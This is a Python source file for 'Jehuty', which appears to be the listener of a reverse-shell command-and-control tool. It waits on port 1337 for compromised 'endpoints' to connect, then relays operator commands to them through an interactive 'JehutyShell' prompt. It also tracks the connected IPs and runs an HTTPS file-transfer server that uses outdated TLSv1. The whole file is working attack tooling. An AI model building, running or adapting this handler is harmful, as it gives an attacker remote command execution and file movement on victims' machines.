import socket, sys, os
from art.jehuty import jehutyMenu
from http.server import SimpleHTTPRequestHandler, socketserver
import ssl


ipList = []

def createSocket():
    global host
    global port
    global s
    try:
        host = ''
        port = 1337
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as err:
        print("Socket creation error: " + str(err))

def bindSocket():
    global host
    global port
    global s
    try:
        bindmsg = '\x1b[0;37;43m' + '[Socket Bind To Port]' + '\x1b[0m' + ' ' + str(port)
        print(bindmsg)
        s.bind((host, port))
        s.listen(5)
    except socket.error as err:
        print("Socket bind error: " + str(err))
        print("\nRetrying to bind...")
        bindSocket()

def acceptSocket():
    global a
    c,a = s.accept()
    conmsg = '\x1b[0;37;42m' + '[Connected]' + '\x1b[0m' + ' - ' + str(a[0])
    print(conmsg)
    ipList.append(str(a[0]))
    sendCmd(c)
    c.close()

def help():
    helpDict = {"[*] 'conns' - ":'Lists all connected endpoints',
                "[*] 'exit' - ":' Exits server & kills sockets',}
    print('\x1b[0;37;43m' + '[===== JEHUTY HELP MENU =====]' + '\x1b[0m')
    for cmd, desc in helpDict.items():
        print(cmd, desc)

def conns():
    print('\x1b[0;37;43m' + '[===== JEHUTY CONNECTED ENDPOINTS =====]' + '\x1b[0m')
    for ip in ipList:
        print(ip)

def encode(cmd):
    return str.encode(cmd)

def sendCmd(c):
    while 1:
        shell = '\x1b[0;37;44m' + '[JehutyShell] $: ' + '\x1b[0m'
        cmd = input(shell)
        if cmd == 'exit':
            c.close()
            s.close()
            main()
        elif cmd == 'conns':
            conns()
            pass
        elif cmd == 'help':
            help()
            pass
        #elif len(str.encode(cmd)) > 0:
        else:
            c.send(encode(cmd))
            response = str(c.recv(99999), "UTF-8")
            print(response, end="")

def startJehuty():
    #Socket exception connection reset by peer ## exception handle this....starts Here
    createSocket()
    bindSocket()
    acceptSocket()

def main():
    os.system('clear')
    print('\n')
    jehutyMenu()
    choice ='0'
    while choice =='0':
        print("Jehuty Menu:\n 1) Start Jehuty Server\n 2) Start HTTPS Server for File Transfer\n 3) Exit")
        choice = input("Please make a choice: ")
        choice = int(choice)
        if choice == 1:
            print("Starting Jehuty Server")
            startJehuty()
        if choice == 2:
            print("Starting HTTPS Server: {}".format('https://0.0.0.0:9999') )
            try:
                httpd = socketserver.TCPServer(('0.0.0.0', 9999), SimpleHTTPRequestHandler)
                httpd.socket = ssl.wrap_socket (httpd.socket,
                        keyfile="key.pem",
                        certfile='cert.pem',
                        server_side=True,
                        ssl_version=ssl.PROTOCOL_TLSv1)
                httpd.serve_forever()
            except KeyboardInterrupt:
                print('Killing HTTPS server...')
                httpd.socket.close()
                main()
        elif choice == 3:
            print("Bye!")
            sys.exit()
        else:
            print("Not a valid choice")

if __name__ == '__main__':
    main()
